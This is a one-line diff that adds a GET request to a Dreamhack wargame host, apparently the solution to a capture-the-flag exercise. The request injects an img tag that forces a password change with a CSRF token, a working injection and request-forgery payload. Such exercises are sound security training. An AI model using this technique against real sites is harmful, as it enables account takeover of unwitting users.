@@ -1,0 +1,1 @@
+GET http://host3.dreamhack.games:23911/vuln?param=<img src="/change_password?pw=dreamhack%26csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb">
